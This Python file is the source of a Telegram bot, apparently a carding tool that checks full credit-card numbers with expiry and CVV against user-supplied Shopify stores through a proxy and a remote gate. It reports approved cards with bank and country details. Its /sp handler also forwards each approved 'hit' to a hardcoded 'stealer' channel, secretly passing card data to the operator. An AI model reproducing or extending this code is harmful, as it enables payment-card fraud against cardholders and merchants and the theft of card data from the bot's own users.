import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import get_charge_resp
from .gate import check_card, PROXY, session, CHECK_URL
from BOT.tools.hit_stealer import send_hit_if_approved

STEALER_CHANNEL_ID = -1002549777556


def get_msg_id(msg_obj, fallback_msg):
    return (
        getattr(msg_obj, "message_id", None)
        or getattr(msg_obj, "id", None)
        or getattr(fallback_msg, "message_id", None)
        or getattr(fallback_msg, "id", None)
    )


def sanitize_response(response_raw):
    if response_raw is None:
        return "No response from server."
    resp_lower = response_raw.lower()
    if "product id is empty" in resp_lower:
        return "The product ID is missing on the store."
    if "receipt id is empty" in resp_lower:
        return "The store receipt ID is missing."
    if "proxy dead" in resp_lower:
        return "The proxy used to test the site is unreachable."
    if "invalid url" in resp_lower:
        return "The supplied URL seems to be invalid."
    return response_raw.strip()


@Client.on_message(filters.command("seturl", [".", "/"]))
async def set_shopify_url(Client, message):
    bot = Client
    text = message.text.strip()
    args = text.split(None, 1)
    if len(args) < 2:
        no_url_msg = (
            "╔══════════════════════╗\n"
            "║ 𝑬𝒓𝒓𝒐𝒓: 𝑵𝒐 𝑼𝒓𝒍 𝑷𝒓𝒐𝒗𝒊𝒅𝒆𝒅 ║\n"
            "╠══════════════════════╣\n"
            "║ 𝗨𝘀𝗮𝗀𝗲: /seturl <𝘀𝘁𝗼𝗋𝗲-𝗇𝗮𝗆𝗲> ║\n"
            "║ 💡 𝘌𝘹𝘢𝘮𝘱𝘭𝘦: /seturl mystore.shopify.com ║\n"
            "╚══════════════════════╝"
        )
        await message.reply(no_url_msg, disable_web_page_preview=True)
        return

    url = args[1].strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    # Save site immediately without validation
    set_user_site(message.from_user.id, url)

    success_message = (
        "╔══════════════════════════════╗\n"
        "║   🌟 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 🌟 ║\n"
        "╠══════════════════════════════╣\n"
        f"║ 🌐 𝐒𝐢𝐭𝐞: {url}\n"
        "║ ⚠️ 𝐍𝐨 𝐂𝐡𝐞𝐜𝐤 𝐏𝐞𝐫𝐟𝐨𝐫𝐦𝐞𝐝\n"
        "║ 📝 𝐔𝐬𝐞 /check 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐭𝐨 𝐯𝐞𝐫𝐢𝐟𝐲 𝐭𝐡𝐢𝐬 𝐬𝐢𝐭𝐞\n"
        "╚══════════════════════════════╝"
    )
    await message.reply(success_message, disable_web_page_preview=True)


@Client.on_message(filters.command("sp", [".", "/"]))
async def self_stored_gate_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            no_cc_msg = (
                "⚠️ 𝐍𝐨 𝐂𝐚𝐫𝐝 𝐃𝐚𝐭𝐚 𝐅𝐨𝐮𝐧𝐝!\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "㊕ 𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐬𝐮𝐩𝐩𝐥𝐲 𝐂𝐂 𝐢𝐧 𝐭𝐡𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞\n"
                "㊕ 𝐔𝐬𝐞 /𝐬𝐩 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            await message.reply(no_cc_msg, disable_web_page_preview=True)
            return

        fullcc = f"{getcc[0]}|{getcc[1]}|{getcc[2]}|{getcc[3]}"
        site = get_user_site(int(user_id))
        if not site:
            no_site_found_msg = (
                "⚠️ ⛔ 𝐍𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞 𝐅𝐨𝐮𝐧𝐝!\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "㊕ 𝐘𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚𝐧𝐲 𝐬𝐢𝐭𝐞 𝐚𝐝𝐝𝐞𝐝\n"
                "㊕ 𝐔𝐬𝐞 𝐭𝐡𝐞 /𝐬𝐞𝐭𝐮𝐫𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐭𝐨 𝐚𝐝𝐝 𝐨𝐧𝐞\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            await message.reply(no_site_found_msg, disable_web_page_preview=True)
            return

        # ensure https
        if not site.startswith("http://") and not site.startswith("https://"):
            site = "https://" + site

        loop = asyncio.get_event_loop()
        raw_resp = await loop.run_in_executor(None, check_card, fullcc, site, PROXY)

        getresp = await get_charge_resp(raw_resp, user_id, fullcc)

        # Compose response
        bin6 = fullcc.split("|")[0][:6]
        getbin = await get_bin_details(bin6)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        proxy_status = "Live ✨"
        owner_link = '</a>href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>'

        finalresp = (
            f"{getresp['status']}\n"
            "━━━━━━━━━━━━━\n"
            f"[㊕] 𝗖𝗖 - <code>{fullcc}</code>\n"
            f"[㊕] 𝗦𝘁𝗮𝘁𝘂𝘀 : {getresp['response']}\n"
            f"[㊕] 𝗚𝗮𝘁𝗲 - (Self Shopify)\n"
            "━━━━━━━━━━━━━\n"
            f"[㊕] Price - ({getresp.get('price', '0')} $)\n"
            "━━━━━━━━━━━━━\n"
            f"[㊕] B𝗶𝗻 : {bin6}\n"
            f"[㊕] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}\n"
            f"[㊕] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}\n"
            f"[㊕] 𝗧𝘆𝗽𝗲 : {brand} | {type_}\n"
            "━━━━━━━━━━━━━\n"
            f"[㊕] T/t : {time.perf_counter() - time.perf_counter():.2f}s | Proxy : {proxy_status}\n"
            f"[㊕] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> [ {role} ]\n"
            f"[㊕] 𝗢𝘄𝗻𝗲𝗿: {owner_link}\n"
            "╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑」━━━━━━╝\n"
        )

        await message.reply(finalresp, disable_web_page_preview=True)

        if getresp["status"] == "Approved ✅":
            await send_hit_if_approved(Client, finalresp)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())


@Client.on_message(filters.command("remsites", [".", "/"]))
async def remove_all_sites(Client, message):
    user_id = message.from_user.id
    from mongodb import usersites_collection
    res = usersites_collection.delete_many({"user_id": user_id})
    reply_msg = (
        "🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝 𝐀𝐥𝐥 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞𝐬\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"㊕ 𝐓𝐨𝐭𝐚𝐥 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 : {res.deleted_count} 𝐒𝐢𝐭𝐞𝐬\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    await message.reply(reply_msg, disable_web_page_preview=True)


@Client.on_message(filters.command("check", [".", "/"]))
async def check_user_stored_sites(Client, message):
    user_id = message.from_user.id
    from mongodb import usersites_collection

    sites_cursor = usersites_collection.find({"user_id": user_id})
    sites = list(sites_cursor)

    if not sites:
        no_sites_msg = (
            "⛔ 𝐍𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞𝐬 𝐅𝐨𝐮𝐧𝐝\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "㊕ 𝐘𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚𝐧𝐲 𝐬𝐭𝐨𝐫𝐞𝐝 𝐬𝐢𝐭𝐞𝐬\n"
            "㊕ 𝐔𝐬𝐞 /𝐬𝐞𝐭𝐮𝐫𝐥 𝐭𝐨 𝐚𝐝𝐝 𝐬𝐭𝐨𝐫𝐞𝐬\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        await message.reply(no_sites_msg, disable_web_page_preview=True)
        return

    reply_lines = [
        "⚡ 𝐘𝐨𝐮𝐫 𝐒𝐭𝐨𝐫𝐞𝐝 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞𝐬\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    ]
    test_card = "4000000000000002|12|26|123"

    for site_doc in sites:
        site = site_doc.get("site_url")
        if not site.startswith("http://") and not site.startswith("https://"):
            site = "https://" + site

        price = None
        response = None
        params = {"cc": test_card, "site": site, "proxy": PROXY}
        try:
            r = await asyncio.get_event_loop().run_in_executor(
                None, lambda: session.get(CHECK_URL, params=params, timeout=30)
            )
            r.raise_for_status()
            data = r.json()
            price = data.get("Price")
            response = data.get("Response")
            print(f"Test card {test_card} returned price:{price} response:{response}")
        except Exception as e:
            print(f"Site test error for card {test_card}: {str(e)}")

        status = "✔️ 𝐀𝐥𝐢𝐯𝐞" if price is not None else "❌ 𝐃𝐞𝐚𝐝"
        site_info = (
            f"㊕ {site}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⃟ 𝐒𝐭𝐚𝐭𝐮𝐬 : {status}\n"
            f"⃟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 : {sanitize_response(response)}\n"
            f"⃟ 𝐄𝐬𝐭𝐢𝐦𝐚𝐭𝐞𝐝 𝐏𝐫𝐢𝐜𝐞 : {price if price is not None else 'N/A'}$\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        reply_lines.append(site_info)

    reply_msg = "\n".join(reply_lines)
    await message.reply(reply_msg, disable_web_page_preview=True)
